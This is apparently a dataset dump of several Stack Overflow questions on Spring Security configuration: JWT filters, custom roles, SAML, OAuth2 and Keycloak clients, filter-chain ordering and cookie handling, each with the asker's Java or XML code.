For admin users, retrieve all equipment without any filtering.
But if I want admin can create a new custom role and add permissions for that role. Example like an low level admin also can retrieve all equipment. The problem is now I can not check user's role for get data API because role is customized, I have to based on permission and permission only like READ,WRITE,..</p>
<p>Should I change permissions to READ_ALL, WRITE_ALL,.. or fixed roles and do not allow user create custom role, only allow user custom permissions of role?</p>
<p>I have read about Attribute-based Access Control(ABAC), it more specific like scope, resource,.. Do I need to change to ABAC for this?</p>
<p>EDIT:
This is my code for filtering based on the user's role. If admin create a new custom role, user will have &quot;ROLE_&quot; + &quot;a random name&quot; that I can not check based on role.</p>
<pre class=""lang-java prettyprint-override""><code>    public Page&lt;EquipmentListDto&gt; getEquipments(GetEquipmentsQueryParam getEquipmentsQueryParam, Pageable pageable) {
        User user = SecurityUtil.getCurrentLoggedInUser(userRepository);
        if (!SecurityUtil.currentUserHasAnyAuthorities(&quot;ROLE_ADMIN&quot;)) {
            getEquipmentsQueryParam.setDepartmentId(user.getDepartment().getId());
        }
        return equipmentRepository.findAll(EquipmentPredicate.getEquipmentsPredicate(getEquipmentsQueryParam), pageable).map(equipmentMapper::toListDto);
    }
</code></pre>
"
"<p>I have implemented a Spring Security filter in my Spring Boot application by extending the <code>OncePerRequestFilter</code> class. The purpose of this filter is to validate the user ID present in the JWT token with the user ID supplied in the URL, which can be in various forms such as the request payload, path parameter, or query string. The scenario in which none of these are present in the URL, I have simply allowed the request to proceed.</p>
<p>However, I have observed that requests with a Content-Type of <code>multipart/form-data</code> are not being allowed by the filter. Although the log statement indicates that the request is proceeding, but the response shows a status of <code>401</code> in HTTP Client(Postman). Additionally, while troubleshooting, I have placed a debug point inside the controller, which is not being hit.</p>
<p><strong>TROUBLESHOOTING:</strong></p>
<p>To troubleshoot the issue, I created a test GET endpoint with no parameters and no payload, which worked fine as expected. However, when I added the Content-Type header with <code>multipart/form-data</code>, that request has been blocked by the filter.</p>
<p>I am unable to figure out the issue, so I made some changes to the code to handle multipart requests, but this has not resolved the problem.</p>
<pre><code>protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() Start&quot;);
        try {
//          wrappedRequest = new ContentCachingRequestWrapper(request);
            CachedBodyHttpServletRequest wrappedRequest = new CachedBodyHttpServletRequest(request);
            valueMap = new HashMap&lt;&gt;();
            boolean hasFormData = false;
            this.setUrl(wrappedRequest.getRequestURL());
            pathMap = UrlParser.getPathValues(url.toString());
            isPathVar = !(pathMap.isEmpty());
            String jwtToken = wrappedRequest.getHeader(&quot;authorizationtoken&quot;);
//          if (null == jwtToken || jwtToken.isEmpty() || jwtToken.isBlank()) {
//              throw new JwtTokenNotFoundException(&quot;Mspin cannot be null, blank or empty&quot;);
//
//          }
            jwtToken = Optional.ofNullable(wrappedRequest.getHeader(&quot;authorizationtoken&quot;))
                    .filter(token -&gt; !token.isEmpty() &amp;&amp; !token.isBlank())
                    .orElseThrow(() -&gt; new JwtTokenNotFoundException(SecurityConstants._TOKEN_NOT_FOUND_ERR_MSG));
            boolean hasParamsOrPayload = wrappedRequest.getParameterMap().size() &gt; 0 || // Check for params
                    wrappedRequest.getContentType() != null
                            &amp;&amp; wrappedRequest.getContentType().contains(SecurityConstants._CONTENT_TYPE)
                    || isPathVar;
            if (!hasParamsOrPayload) {
                hasFormData = wrappedRequest.getContentType() != null
                        &amp;&amp; (wrappedRequest.getContentType().contains(SecurityConstants._MULTIPART_CONTENT_TYPE)
                                || wrappedRequest.getContentType()
                                        .contains(SecurityConstants._X_WWW_FORM_URLENCODED_CONTENT_TYPE));
            }
            log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() - hasParamsOrPayload&quot;, hasParamsOrPayload);
            if (!hasFormData) {
                byte[] contentAsByteArray = requestToByteArray(wrappedRequest);
                valueMap = JsonParserUtil.getJsonKeyValueMap(contentAsByteArray);
                if (!valueMap.isEmpty() &amp;&amp; !valueMap.containsKey(MSPIN)) {
                    if (!(wrappedRequest.getParameterMap().size() &gt; 0)) {
                        hasParamsOrPayload = Boolean.FALSE;
                    }
                }
            }

            if (hasParamsOrPayload || isPathVar) {
                log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() - available headers&quot;,
                        wrappedRequest.getHeaderNames());

//              String authorizationHeader = wrappedRequest.getHeader(&quot;authorizationtoken&quot;);
//              jwtToken = authorizationHeader != null &amp;&amp; authorizationHeader.startsWith(&quot;Bearer &quot;)
//                      ? authorizationHeader.substring(7)
//                      : null;
                Map&lt;String, Object&gt; claims = jwtDecoder.decodeJWT(jwtToken);
                mspinFromJwtToken = claims.get(MSPIN).toString();
                extractMspinV1(wrappedRequest);
                checkEquality(mspinList);

                if (mspinFound) {
                    log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() Request Authorized and proceeded&quot;);
                    filterChain.doFilter(wrappedRequest, response);
                    log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() Resetting parameteres&quot;);
                    reset();
                } else {
                    log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() Request unauthorized,access denied&quot;);
                    log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() Resetting parameteres&quot;);
                    reset();
                    throw new AccessDeniedException(SecurityConstants._ACCESS_DENIED_ERR_MSG);
                }
            } else {
                log.info(&quot;UserIdAuthenticationFilter.doFilterInternal() No param or payload found, request proceed&quot;);
                filterChain.doFilter(wrappedRequest, response);
            }
        } catch (Exception e) {
            log.error(&quot;UserIdAuthenticationFilter.doFilterInternal() error occured&quot;, e);
            handlerExceptionResolver.resolveException(request, response, null, e);
        }
    }
</code></pre>
<p>The current logic allows the request to proceed to the respective controller if it contains <code>multipart/form-data</code>. This behavior is verified by the debugger, as the following code is executed:</p>
<pre><code>log.error(&quot;UserIdAuthenticationFilter.doFilterInternal() error occured&quot;, e);
handlerExceptionResolver.resolveException(request, response, null, e);
</code></pre>
<p>However, the observed behavior differs from what is expected. In the HTTP client (such as Postman), the response is shown as {} with a status of 401, as depicted in the image below:</p>
<p>It means that there is something went wrong behind the scene, and that is where I am stuck</p>
<p><a href=""https://i.stack.imgur.com/Tj0Dh.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Tj0Dh.png"" alt=""enter image description here"" /></a></p>
<p>CONFIGURATION:</p>
<pre><code>@Autowired
    @Qualifier(&quot;handlerExceptionResolver&quot;)
    HandlerExceptionResolver handlerExceptionResolver;

    @Bean
    public UserIdAuthenticationFilter userIdAuthenticationFilter() {
        return new  UserIdAuthenticationFilter(handlerExceptionResolver);
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        StringBuffer sb = constuctAntMatcher();
        http.headers().httpStrictTransportSecurity().includeSubDomains(true).maxAgeInSeconds(_MAX_AGE_IN_SEC)
                .requestMatcher(AnyRequestMatcher.INSTANCE);
        return http.csrf().disable().authorizeRequests().antMatchers(sb.toString()).authenticated().and().formLogin()
                .disable() // Disable default login page
                .httpBasic().disable().addFilterBefore(userIdAuthenticationFilter(), BasicAuthenticationFilter.class)
                .build();

    }
</code></pre>
<p>any help would be appreciated</p>
"
"<p>I am getting below error when I start my application. I am not sure how I set primary bean here.</p>
<blockquote>
<p>AnnotationConfigServletWebServerApplicationContext | Exception
encountered during context initialization - cancelling refresh
attempt:
org.springframework.beans.factory.UnsatisfiedDependencyException:
Error creating bean with name
'org.springframework.security.config.annotation.web.configuration.WebSecurityConfiguration':
Unsatisfied dependency expressed through field 'httpSecurity': Error
creating bean with name
'org.springframework.security.config.annotation.web.configuration.HttpSecurityConfiguration.httpSecurity'
defined in
org.springframework.security.config.annotation.web.configuration.HttpSecurityConfiguration:
Failed to instantiate
[org.springframework.security.config.annotation.web.builders.HttpSecurity]:
Factory method 'httpSecurity' threw exception with message: Found 3
beans for type interface
org.springframework.security.authentication.AuthenticationManager, but
none marked as primary</p>
</blockquote>
<p>This is typically happening when I am upgrading my app to Tomcat 10 and spring 6.</p>
<p>Below are those 3 bean names which are logged:
org.springframework.security.authenticationManager : org.springframework.security.authentication.ProviderManager
org.springframework.security.config.authentication.AuthenticationManagerFactoryBean#0 : org.springframework.security.authentication.ProviderManager
org.springframework.security.config.http.HttpSecurityBeanDefinitionParser$ChildAuthenticationManagerFactoryBean#0 : org.springframework.security.authentication.ProviderManager</p>
<p>Below is my Spring-security-context.xml</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xmlns:security=&quot;http://www.springframework.org/schema/security&quot;
       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;

    &lt;context:property-placeholder/&gt;

    &lt;security:global-method-security pre-post-annotations=&quot;enabled&quot;/&gt;

    &lt;security:authentication-manager alias=&quot;authenticationManager&quot;&gt;
        &lt;security:authentication-provider ref=&quot;authProvider&quot;/&gt;
    &lt;/security:authentication-manager&gt;

    &lt;bean id=&quot;http403ForbiddenEntryPoint&quot;
          class=&quot;org.springframework.security.web.authentication.Http403ForbiddenEntryPoint&quot;/&gt;

    &lt;bean id=&quot;authProvider&quot; class=&quot;com.abc.security.AuthenticationProvider&quot; primary=&quot;true&quot;/&gt;

    &lt;bean id=&quot;validateSessionService&quot; class=&quot;com.abc.authserviceclient.ValidateSessionService&quot;&gt;
        &lt;constructor-arg name=&quot;serviceUrl&quot; value=&quot;${security.session.service.url}&quot;/&gt;
    &lt;/bean&gt;

    &lt;bean id=&quot;preauthFilter&quot; class=&quot;com.abc.security.AuthenticationFilter&quot;&gt;
        &lt;constructor-arg name=&quot;productID&quot; value=&quot;${security.productId}&quot;/&gt;
        &lt;constructor-arg name=&quot;appURL&quot; value=&quot;${security.appURL}&quot;/&gt;
        &lt;constructor-arg name=&quot;requestValidation&quot; ref=&quot;requestValidation&quot;/&gt;
        &lt;property name=&quot;authenticationManager&quot; ref=&quot;authenticationManager&quot;/&gt;
    &lt;/bean&gt;

    &lt;security:http auto-config=&quot;false&quot; create-session=&quot;stateless&quot; entry-point-ref=&quot;http403ForbiddenEntryPoint&quot;&gt;
        &lt;security:csrf token-repository-ref=&quot;csrfTokenRepository&quot; disabled=&quot;true&quot;/&gt;

        &lt;security:intercept-url pattern=&quot;/metrics/healthcheck&quot; access=&quot;permitAll&quot;/&gt;
        &lt;security:intercept-url pattern=&quot;/validation/healthcheck&quot; access=&quot;permitAll&quot;/&gt;
        &lt;security:intercept-url pattern=&quot;/actuator/info&quot; access=&quot;permitAll&quot;/&gt;
        &lt;security:intercept-url pattern=&quot;/actuator/health&quot; access=&quot;permitAll&quot;/&gt;
        &lt;security:intercept-url pattern=&quot;/error&quot; access=&quot;permitAll&quot;/&gt;
        &lt;security:intercept-url pattern=&quot;/&quot; access=&quot;isAuthenticated()&quot;/&gt;

        &lt;security:custom-filter position=&quot;PRE_AUTH_FILTER&quot; ref=&quot;preauthFilter&quot;/&gt;
        &lt;security:custom-filter before=&quot;CSRF_FILTER&quot; ref=&quot;csrfHeaderPreFilter&quot;/&gt;
        &lt;security:custom-filter after=&quot;CSRF_FILTER&quot; ref=&quot;csrfHeaderFilter&quot;/&gt;
    &lt;/security:http&gt;

    &lt;bean id=&quot;requestValidation&quot;
          class=&quot;com.abc.security.validation.MockedRequestValidation&quot;/&gt;
    &lt;bean id=&quot;csrfHeaderFilter&quot; class=&quot;com.abc.security.validation.MockedCsrfHeaderFilter&quot;&gt;
&lt;!--        &lt;constructor-arg name=&quot;csrfDisabled&quot; value=&quot;true&quot;/&gt;--&gt;
    &lt;/bean&gt;
    &lt;bean id=&quot;csrfHeaderPreFilter&quot;
          class=&quot;com.abc.security.validation.MockedCsrfHeaderPreFilter&quot;&gt;
&lt;!--        &lt;constructor-arg name=&quot;cookieCsrfTokenRepository&quot; ref=&quot;csrfTokenRepository&quot;/&gt;--&gt;
&lt;!--        &lt;constructor-arg name=&quot;csrfDisabled&quot; value=&quot;true&quot;/&gt;--&gt;
    &lt;/bean&gt;

    &lt;bean id=&quot;csrfTokenRepository&quot; class=&quot;org.springframework.security.web.csrf.CookieCsrfTokenRepository&quot;&gt;
        &lt;property name=&quot;headerName&quot; value=&quot;X-XSRF-TOKEN&quot;/&gt;
        &lt;property name=&quot;cookieHttpOnly&quot; value=&quot;false&quot;/&gt;
    &lt;/bean&gt;
    &lt;bean id=&quot;certificateExtractor&quot;
          class=&quot;com.abc.security.certificate.MockCertificateExtractor&quot;/&gt;

&lt;/beans&gt;
</code></pre>
"
"<p>I need to add an extra parameter called &quot;locale&quot; to the idp url. The url should look like this : https://idpURL?SAMLRequest=...&amp;RelayState=...&amp;SigAlg=...&amp;Signature=...&amp;<strong>Locale=DE</strong></p>
<p>I've already done a project that uses the idp to connect. Now I'd like to add this parameter.</p>
<pre><code>    @Bean
public SecurityFilterChain filterChain(final HttpSecurity http,
                                       final RelyingPartyRegistrationRepositoryImpl rpRepo,
                                       final SamlResponseAuthenticationConverter authConverter) throws Exception {
    RelyingPartyResolver relyingPartyRegistrationResolver = new RelyingPartyResolver(rpRepo);
    OpenSaml4AuthenticationRequestResolver authenticationRequestResolver = new OpenSaml4AuthenticationRequestResolver(relyingPartyRegistrationResolver);
    authenticationRequestResolver.setRequestMatcher(new AntPathRequestMatcher(&quot;/saml/login&quot;));
    authenticationRequestResolver.setAuthnRequestCustomizer(authnRequestCustomizer());

    OpenSaml4AuthenticationProvider authenticationProvider = new OpenSaml4AuthenticationProvider();
    authenticationProvider.setResponseAuthenticationConverter(authConverter);

    http.saml2Login(samlLogin -&gt;
            samlLogin
                    .successHandler(samlSuccessRedirectHandler())
                    .authenticationManager(new ProviderManager(authenticationProvider))
                    .authenticationRequestResolver(authenticationRequestResolver)
                    .authenticationConverter(new Saml2AuthenticationTokenConverter(relyingPartyRegistrationResolver))
                    .loginProcessingUrl(&quot;/saml/SSO&quot;));

    return http.build();
}

/**
 * @return Options used to build the outgoing SAML authentication requests.
 */
@Bean
protected Consumer&lt;OpenSaml4AuthenticationRequestResolver.AuthnRequestContext&gt; authnRequestCustomizer() {
    return (c) -&gt; {
        final AuthnRequest authnRequest = c.getAuthnRequest();

        NameIDPolicy nameIdPolicy = (NameIDPolicy) XMLObjectSupport.buildXMLObject(NameIDPolicy.DEFAULT_ELEMENT_NAME);
        nameIdPolicy.setAllowCreate(true);
        nameIdPolicy.setFormat(&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;);
        authnRequest.setNameIDPolicy(nameIdPolicy);

        authnRequest.setForceAuthn(true);

        RequestedAuthnContext requestedAuthnContext = (RequestedAuthnContext) XMLObjectSupport.buildXMLObject(RequestedAuthnContext.DEFAULT_ELEMENT_NAME);
        requestedAuthnContext.setComparison(AuthnContextComparisonTypeEnumeration.EXACT);

        AuthnContextClassRef authnContextClassRef = (AuthnContextClassRef) XMLObjectSupport.buildXMLObject(AuthnContextClassRef.DEFAULT_ELEMENT_NAME);
        authnContextClassRef.setAuthnContextClassRef(AUTHN_CONTEXT_CLASS_REF);

        requestedAuthnContext.getAuthnContextClassRefs().add(authnContextClassRef);


        authnRequest.setRequestedAuthnContext(requestedAuthnContext);
    };
}

@Bean
SamlSavedRequestAwareAuthenticationSuccessHandler samlSuccessRedirectHandler() {
    return new SamlSavedRequestAwareAuthenticationSuccessHandler()();
}
</code></pre>
<p>The Saml2WebSsoAuthenticationRequestFilter (from package org.springframework.security.saml2.provider.service.web) takes care of adding various parameters to the idp url via the method. Would it be possible to force it to add other parameters? Is there another way of adding a parameter to this url?</p>
"
"<p>I'm using Spring GraphQL. Here is how my security config looks like:</p>
<pre><code>@EnableWebSecurity
@Configuration
public class SecurityConfig {

  @Bean
  public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf().disable()
        .authorizeRequests(authorizeRequests -&gt;
            authorizeRequests
                .antMatchers(&quot;/myapi/v1/graphql&quot;)
                .authenticated()
                .anyRequest()
                .permitAll()
        )
        .oauth2ResourceServer(OAuth2ResourceServerConfigurer::jwt);
    return http.build();
  }
}
</code></pre>
<p>And I wanted to remove authentication on OPTIONS request. So I changed the config to look like this:</p>
<pre><code>http
        .csrf().disable()
        .authorizeRequests(authorizeRequests -&gt;
            authorizeRequests
                .antMatchers(HttpMethod.OPTIONS, &quot;/myapi/v1/graphql&quot;)
                .permitAll()
                .antMatchers(HttpMethod.POST, &quot;/myapi/v1/graphql&quot;)
                .authenticated()
                .anyRequest()
                .permitAll()
        )
        .oauth2ResourceServer(OAuth2ResourceServerConfigurer::jwt);
    return http.build();
</code></pre>
<p>But when I use Postman with OPTIONS as the method, I get the following issues:</p>
<ol>
<li>Select &quot;No Auth&quot; in authorization tab =&gt; 404</li>
<li>Select &quot;Bearer token&quot; in authorization tab =&gt; 401</li>
</ol>
<p>What am I missing? How do I fix this?</p>
"
"<p>With Spring Boot 3 and Security 6, I have the following Security filters</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
@Order(1)
public SecurityFilterChain showLoginFormFilter(HttpSecurity http) throws Exception {
    http.authorizeHttpRequests(auth -&gt; {
        // Main page
        auth.requestMatchers(&quot;/&quot;).permitAll();
        // Customer site
        auth.requestMatchers(&quot;/customers**&quot;).authenticated();

        // Any other request must be authenticated
        auth.anyRequest().authenticated();   // No change if commented.
    });

    // Client setting - shows the login screen
    http.oauth2Login(withDefaults());

    return http.build();
}

@Bean
@Order(3)
public SecurityFilterChain publicDownloadRedirectFilter(HttpSecurity http) throws Exception {
    LOGGER.info(&quot;publicDownloadRedirectFilter - Initialized&quot;);
    http.securityMatcher(&quot;/downloadRedirect/**&quot;)
            .authorizeHttpRequests(authorize -&gt; authorize
                    .requestMatchers(new DownloadRedirectMatcher()).permitAll()
                    .anyRequest().authenticated()
    );

    return http.build();
}
</code></pre>
<p>DownloadRedirectMatcher is like</p>
<pre class=""lang-java prettyprint-override""><code>public class DownloadRedirectMatcher implements org.springframework.security.web.util.matcher.RequestMatcher {
    private static final Logger LOGGER = LoggerFactory.getLogger(DownloadRedirectMatcher.class);

    @Override
    public boolean matches(HttpServletRequest request) {
        LOGGER.info(&quot;Custom matcher ************* {}&quot;, &quot;public&quot;.equals(request.getHeader(&quot;X-Public&quot;)));
        return (&quot;public&quot;.equals(request.getHeader(&quot;X-Public&quot;)));
    }
}
</code></pre>
<p>What I was expecting:</p>
<ol>
<li>If / is called the page is displayed (OK)</li>
<li>If /customer/ is called the page asks for user/password (OK)</li>
<li>If /downloadRedirect is called with a &quot;public&quot; header then the permitAll is applied, instead the /login page is called and user/password are prompted (NG)</li>
</ol>
<p>It's like the publicDownloadRedirectFilter is never applied.</p>
<p><strong>Another try:</strong></p>
<p>Both filters with securityMatcher, something like</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
@Order(1)
public SecurityFilterChain clientFilterChain(HttpSecurity http) throws Exception {
    LOGGER.info(&quot;clientFilterChain - Initialized&quot;);

    http.securityMatcher(&quot;/customer*&quot;)
            .authorizeHttpRequests(authorize -&gt; authorize
                    .anyRequest().authenticated()
            );
    // Client setting - shows the login screen
    http.oauth2Login(withDefaults());

    return http.build();
}

// And same publicDownloadRedirectFilter
</code></pre>
<p>But now the result is</p>
<ol>
<li>If / is called the page is displayed (OK)</li>
<li>If /customer/ is called the /login page is not found and 404 is returned (NG)</li>
<li>If /downloadRedirect is called with a &quot;public&quot; header then the permitAll is applied. (OK)</li>
</ol>
<p>Any help will be appreciated.</p>
"
"<p>2024-02-29T12:22:12.726+05:30 ERROR 3552 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Handler dispatch failed: java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter] with root cause</p>
<p>2024-02-29T12:22:12.735+05:30 DEBUG 3552 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Securing POST /error2024-02-29T12:22:12.735+05:30 DEBUG 3552 --- [nio-8080-exec-1] o.s.s.w.a.AnonymousAuthenticationFilter  : Set SecurityContextHolder to anonymous SecurityContext</p>
<pre><code>@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
@Autowired
private UserDetailsService userDetailsService;
@Autowired
private JwtTokenHelper jwtTokenHelper;
@Override
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
    String requestToken = request.getHeader(&quot;Authorization&quot;);
    String username = null;
    String token = null;
    if (requestToken != null &amp;&amp; requestToken.startsWith(&quot;Bearer&quot;)) {
         token = requestToken.substring(7);
         try{username=this.jwtTokenHelper.getUsernameFromToken(token);}
         catch (IllegalArgumentException e){System.out.println(&quot;Unable to get jwt token&quot;);}
         catch(ExpiredJwtException e){System.out.println(&quot;Jwt token has expired&quot;);}
         catch (MalformedJwtException e){System.out.println(&quot;Invalid jwt&quot;);}
    }
    else{System.out.println(&quot; Jwt token does not begin with Bearer&quot;);}

    if (username != null &amp;&amp; SecurityContextHolder.getContext().getAuthentication()==null){
        UserDetails userDetails =this.userDetailsService.loadUserByUsername(username);
        if(this.jwtTokenHelper.validateToken(token,userDetails)){
            UsernamePasswordAuthenticationToken usernamePasswordAuthenticationToken = new UsernamePasswordAuthenticationToken(userDetails,null,userDetails.getAuthorities());
            usernamePasswordAuthenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
            SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthenticationToken);
        }
        else{
            System.out.println(&quot;Invalid jwt&quot;);
        }
    }
    else{

    }
    filterChain.doFilter(request,response);
}}
</code></pre>
<p>Auth controller</p>
<pre><code>@RestController
@RequestMapping(&quot;api/v1/auth&quot;)
public class AuthController {
@Autowired
private JwtTokenHelper jwtTokenHelper;
@Autowired
private UserDetailsService userDetailsService;
@Autowired
public AuthenticationManager authenticationManager;

@Autowired
private UserService userService;

@PostMapping(&quot;/login&quot;)
public ResponseEntity&lt;JwtAuthResponse&gt; createToken(@RequestBody JwtAuthRequest request) throws Exception{
    this.authenticate(request.getUsername(),request.getPassword());
    UserDetails userDetails = this.userDetailsService.loadUserByUsername(request.getUsername());
    String token = this.jwtTokenHelper.generateToken(userDetails);
    JwtAuthResponse response = new JwtAuthResponse();
    response.setToken(token);
    return new ResponseEntity&lt;JwtAuthResponse&gt;(response, HttpStatus.OK);
}

private void authenticate(String username, String password) throws  Exception{
    UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(username,password);
   try{
       authenticationManager.authenticate(authenticationToken);
   }catch (BadCredentialsException e){
       System.out.println(&quot;Invalid Details&quot;);
       throw new ApiException(&quot;Invalid Username or Password&quot;);
   }
}

@PostMapping(&quot;/register&quot;)
public ResponseEntity&lt;UserDto&gt; regidterUser(@RequestBody UserDto userDto){
    UserDto registerdUser = this.userService.registerNewUser(userDto);
    return new ResponseEntity&lt;UserDto&gt;(registerdUser,HttpStatus.CREATED);
}}
</code></pre>
<p>config files</p>
<pre><code>@Configuration
class MyConfig {
@Autowired
UserRepo userRepo;
@Bean
public DaoAuthenticationProvider authProvider() {
    DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
    provider.setPasswordEncoder(passwordEncoder());
    provider.setUserDetailsService(userDetailsService());
    return provider;
}

@Bean
public UserDetailsService userDetailsService() {
    return new UserDetailsService() {
        @Override
        public UserDetails loadUserByUsername(String username) {
            return userRepo.findByEmail(username).orElseThrow(()-&gt; new ResourceNotFoundException(&quot;User&quot;,&quot;email:&quot;+username,0));
        }
    };
}
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}

@Bean
public AuthenticationManager authenticationManager(AuthenticationConfiguration builder) throws Exception {
    return builder.getAuthenticationManager();
}}
</code></pre>
<p>security config</p>
<pre><code> @Configuration
 @EnableWebSecurity
 @EnableWebMvc
public class SecurityConfig{

public static final String[] PUBLIC_URLS={
        &quot;api/v1/auth/**&quot;,
        &quot;/v3/api-docs&quot;,
        &quot;/v2/api-docs&quot;,
        &quot;/swagger-resources/**&quot;,
        &quot;/swagger-ui/**&quot;,
        &quot;/webjars/**&quot;

};

@Autowired
private JwtAuthenticationEntryPoint jwtAuthenticationEntryPoint;

@Autowired
private JwtAuthenticationFilter jwtAuthenticationFilter;

@Bean
protected SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
            .csrf(AbstractHttpConfigurer::disable)
            .authorizeHttpRequests((authz)-&gt; authz
            .requestMatchers(PUBLIC_URLS).permitAll()
            .requestMatchers(HttpMethod.GET).permitAll()
            .anyRequest()
            .authenticated())
            .exceptionHandling(ex -&gt; ex.authenticationEntryPoint(this.jwtAuthenticationEntryPoint))
            .sessionManagement(session-&gt;session.sessionCreationPolicy(SessionCreationPolicy.STATELESS));

   http
           .addFilterBefore( this.jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class);

   return http.build();
}}
</code></pre>
"
"<p>If I request for token from keycloak with Postman or RestTemplate then the Keycloak protocol mapper is triggered but if I request for token with the below code then I get the token but the Keycloak protocol mapper is not triggered.</p>
<pre><code>import org.springframework.security.oauth2.client.AuthorizedClientServiceOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizeRequest;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.registration.ClientRegistration;

private static final String CLIENT_REGISTRATION_ID = &quot;my-id&quot;;

private final AuthorizedClientServiceOAuth2AuthorizedClientManager oAuth2AuthorizedClientManager;
private final ClientRegistrationRepository clientRegistrationRepository;

public FeignClientConfiguration(AuthorizedClientServiceOAuth2AuthorizedClientManager oAuth2AuthorizedClientManager,
                                       ClientRegistrationRepository clientRegistrationRepository) {
    this.oAuth2AuthorizedClientManager = oAuth2AuthorizedClientManager;
    this.clientRegistrationRepository = clientRegistrationRepository;
}

@Bean
public RequestInterceptor requestInterceptor() {
    ClientRegistration clientRegistration = clientRegistrationRepository.findByRegistrationId(CLIENT_REGISTRATION_ID);
    OAuthClientCredentialsFeignManager clientCredentialsFeignManager =
            new OAuthClientCredentialsFeignManager(oAuth2AuthorizedClientManager, clientRegistration);
    return requestTemplate -&gt; {
        requestTemplate.header(&quot;Authorization&quot;, &quot;Bearer &quot; + clientCredentialsFeignManager.getAccessToken());
    };
}
</code></pre>
<p>the application.yml has below entries</p>
<pre><code>spring:
  security:
    oauth2:
      client:
        registration:
          my-id:
            client-id: my-client-id
            client-secret: x43kka0-c9dc-1234-5678-31552f4dbb0c
            authorization-grant-type: client_credentials
        provider:
          keycloak:
            token-uri: http://localhost:10012/auth/realms/my-realm/protocol/openid-connect/token
</code></pre>
<p>Any ideas?</p>
"
"<p><a href=""https://i.stack.imgur.com/W4SWP.png"" rel=""nofollow noreferrer"">enter image description here</a>
i use spring and react. And I request login to server.
In response, the cookie is sent from spring.
<a href=""https://i.stack.imgur.com/gaYDI.png"" rel=""nofollow noreferrer"">enter image description here</a>
As you see, not in the application.</p>
<p><a href=""https://i.stack.imgur.com/mrf3x.png"" rel=""nofollow noreferrer"">enter image description here</a>
And i send request that need authentication to the server. but there is no cookie in request</p>
<p>While, I send request that use oauth2 then the cookie exist in application and work well.</p>
<p>i dont know why this happens</p>
<p>i attach my code</p>
<pre class=""lang-java prettyprint-override""><code>    @Override
    protected void successfulAuthentication(HttpServletRequest request, HttpServletResponse response, FilterChain chain, Authentication authResult) throws IOException, ServletException {

        ClientDetails clientDetails = (ClientDetails) authResult.getPrincipal();
        //provider의 결과로 여기에 저장됨

        String username = clientDetails.getUsername();

        Collection&lt;? extends GrantedAuthority&gt; authorities = authResult.getAuthorities();
        Iterator&lt;? extends GrantedAuthority&gt; iterator = authorities.iterator();
        GrantedAuthority auth = iterator.next();
        String role = auth.getAuthority();

        TokenDto token = jwtUtil.createJwt(username, role,&quot;false&quot;);

        refreshTokenService.save(token,username);
        response.addCookie(createCookie(CookieType.Authorization.name(),token.getAccessToken()));
        response.addCookie(createCookie(CookieType.Refresh.name(), token.getRefreshToken()));
        response.getWriter().write(&quot;success&quot;);
    }

    private Cookie createCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);
        cookie.setMaxAge(60 * 5);
        cookie.setSecure(true);
        cookie.setPath(&quot;/&quot;);
        cookie.setHttpOnly(true);

        return cookie;
    }
</code></pre>
<p>this is the process when login that not use oauth2 success</p>
<pre class=""lang-java prettyprint-override""><code>    @Override
    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException {


        CustomOauth2Client oauth2Client = (CustomOauth2Client) authentication.getPrincipal();

        System.out.println(oauth2Client);
        String username = oauth2Client.getUsername();

        Collection&lt;? extends GrantedAuthority&gt; authorities = oauth2Client.getAuthorities();
        Iterator&lt;? extends GrantedAuthority&gt; iterator = authorities.iterator();
        GrantedAuthority auth = iterator.next();
        String role = auth.getAuthority();

        TokenDto token = jwtUtil.createJwt(username, role,&quot;true&quot;);

        refreshTokenService.save(token,username);
        response.addCookie(createCookie(CookieType.Authorization.name(),token.getAccessToken()));
        response.addCookie(createCookie(CookieType.Refresh.name(), token.getRefreshToken()));
        response.getWriter().write(&quot;success&quot;);
        response.sendRedirect(&quot;http://localhost:3000/&quot;);
    }

    private Cookie createCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);
        cookie.setMaxAge(60 * 5);
        cookie.setSecure(true);
        cookie.setPath(&quot;/&quot;);
